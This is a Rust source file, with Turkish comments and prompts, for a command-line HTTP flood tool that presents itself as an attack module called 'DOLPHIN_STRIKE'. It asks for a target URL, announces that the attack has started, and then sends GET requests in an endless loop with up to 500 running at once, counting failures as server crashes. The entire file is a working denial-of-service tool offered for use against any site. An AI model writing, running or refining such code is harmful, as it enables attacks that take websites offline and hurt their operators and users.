use reqwest::Client;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::sleep;
use std::io::{self, Write};
use std::time::Duration;

#[tokio::main]
async fn main() {
    // Ekranı temizle (Clear Screen)
    print!("\x1b[2J\x1b[1;1H"); 

    // Matrix Yeşili Başlık
    println!("\x1b[32m");
    println!(r#"
    __  ____  ______        ______  ______  _______
   /  |/  /\ \/ / __/  ____/ __ \ \/ / __ \/ ___/ /
  / /|_/ /  \  /\ \   /___/ /_/ /\  / /_/ / /__  / 
 /_/  /_/   /_/___/       \____/ /_/\____/\___/_/  
    
    >> [ SYSTEM STATUS: ACTIVE ]
    >> [ MODULE: DOLPHIN_STRIKE ]
    "#);
    println!("\x1b[0m");

    print!("\x1b[32m[#] HEDEF URL: \x1b[0m");
    io::stdout().flush().unwrap();

    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();

    println!("\n\x1b[32m[!] Saldırı başlatıldı. Durdurmak için CTRL+C\x1b[0m\n");
    
    attack_loop(target).await;
}

async fn attack_loop(target: String) {
    let client = Client::new();
    let semaphore = Arc::new(Semaphore::new(500)); 

    loop {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let c = client.clone();
        let t = target.clone();
        tokio::time::sleep(Duration::from_micros(200)).await;

        tokio::spawn(async move {
            let res = c.get(t).send().await;
            match res {
                Ok(_) => {
                    // Başarılı istek: Parlak Yeşil '>>'
                    print!("\x1b[92m>>\x1b[0m"); 
                }
                Err(_) => {
                    // Hata/Sunucu Çökmesi: Kırmızı '!!'
                    print!("\x1b[31m!!\x1b[0m"); 
                }
            }
            let _ = io::stdout().flush();
            drop(permit);
        });
        
        tokio::time::sleep(Duration::from_millis(1)).await;
    }
    
}